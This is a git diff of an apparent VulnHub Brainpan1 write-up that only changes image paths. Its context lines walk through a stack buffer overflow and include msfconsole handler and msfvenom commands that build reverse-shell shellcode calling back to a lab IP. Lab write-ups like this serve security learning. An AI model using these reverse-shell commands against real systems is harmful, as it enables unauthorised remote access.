@@ -79,10 +79,10 @@ Nmap done: 1 IP address (1 host up) scanned in 52.15 seconds
 Cool! There is a *SimpleHTTPServer* (p:10000) and something what appears like a custom made login application (p:9999).
 
 Web server:
-<img src="/img/blog/brainpan1/brainpan1-01.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-01.png">
 
 Login application on port *9999* upon netcat connection:
-<img src="/img/blog/brainpan1/brainpan1-02.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-02.png">
 
 While I spend time fuzzing port 9999 (for previously mentioned BOF), I also run dirb to see what I can get from the website.
 
@@ -109,11 +109,11 @@ END_TIME: Thu Nov  9 12:36:07 2017
 DOWNLOADED: 1019 - FOUND: 1
 ```
 
-<img src="/img/blog/brainpan1/brainpan1-03.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-03.png">
 
 An exe file should quite handy for debugging. I transfer it to my Windows VM, attach [Immunity debugger](https://www.immunityinc.com/products/debugger/) and inspect it.
    
-<img src="/img/blog/brainpan1/brainpan1-04.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-04.png">
 
 It is the same application that `Brainpan1` is running! Thanks to this we can freely test the program locally without causing damage to the real target.
   
@@ -160,7 +160,7 @@ except:
 
 > Note: The IP change to .228 is due to tests being conducted on a new Windows VM
 
-<img src="/img/blog/brainpan1/brainpan1-05.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-05.png">
 
 We get a crash at `0x41414141` (hex representation of A) as expected, because EIP got overwritten. To exactly find the instruction pointer a tool like metasploit `pattern-create.rb` can be used.
 
@@ -173,7 +173,7 @@ h0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6
 ```
 `pattern-create.rb` ensures the generated string has unique sequence of characters. After the crash, finding the EIP offset will be easy as no sequence is the same and instruction pointer will have an unique value. Relaunch the python script with the long pattern and see what happens.
 
-<img src="/img/blog/brainpan1/brainpan1-06.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-06.png">
 
 Crash at an offset of **0x35724134**. The gained value can be afterwards put into next tool - `pattern-offset.rb`.
 
@@ -185,11 +185,11 @@ The meaning is pretty self-explanatory. `pattern_offset` takes a hex string quer
 
 All the addresses end with a null byte which makes it hard / impossible to jump to. By supplying such address we would terminate our input on the last byte, which would lead to unwanted behaviour (possible crashes). Luckily if you notice in [picture 5](https://raw.githubusercontent.com/V3ded/V3ded.github.io/master/img/blog/brainpan1/brainpan1-05.png) the stack pointer (ESP) points to the beginning of our overflowed buffer after overwritten EIP.
 
-<img src="/img/blog/brainpan1/brainpan1-10.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-10.png">
 
 That means that if we overwrite the return address with `jmp esp` instruction we can hop right into our shellcode! Use `CTRL-F`, search for the instruction and copy the address.
 
-<img src="/img/blog/brainpan1/brainpan1-07.png">  
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-07.png">  
 
 You can use any shellcode but I'll simply stick to one generated with msfvenom. Here is the remote exploit:
   
@@ -272,14 +272,14 @@ except:
 
 If done correctly the reverse shell should arrive to the handler you set up via `msfconsole -q -x "use exploit/multi/handler;set payload windows/shell/reverse_tcp; set LHOST eth0; set LPORT 3333; run"`. 
 
-<img src="/img/blog/brainpan1/brainpan1-08.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-08.png">
 > TIP: msfconsole -x can be used to chain many metasploit commands into one!   
 
 Concept of  BOFs is kind of complicated and describing it within one blogpost is impossible. I highly recommend binary hacking series by [LiveOverflow](https://www.youtube.com/playlist list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) to begin learning if anything is unclear. 
 
 Now that we have the exploit figured out, replace the windows shellcode with linux one (`msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.66 LPORT=3333 -f py -b '\x00'`) and re-run it on original Brainpan machine (**192.168.0.110**).  
 
-<img src="/img/blog/brainpan1/brainpan1-09.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/brainpan1-09.png">
 
 > TIP: `python -c 'import pty; pty.spawn("/bin/sh")'` = A TTY shell for easier console interaction
 
@@ -318,7 +318,7 @@ root
 ***
 
 ## Rooooted!
-<img src="/img/blog/brainpan1/celeb.png">
+<img src="/assets/img/blog/vulnhub-brainpan1/celeb.png">
 
 *** 
 
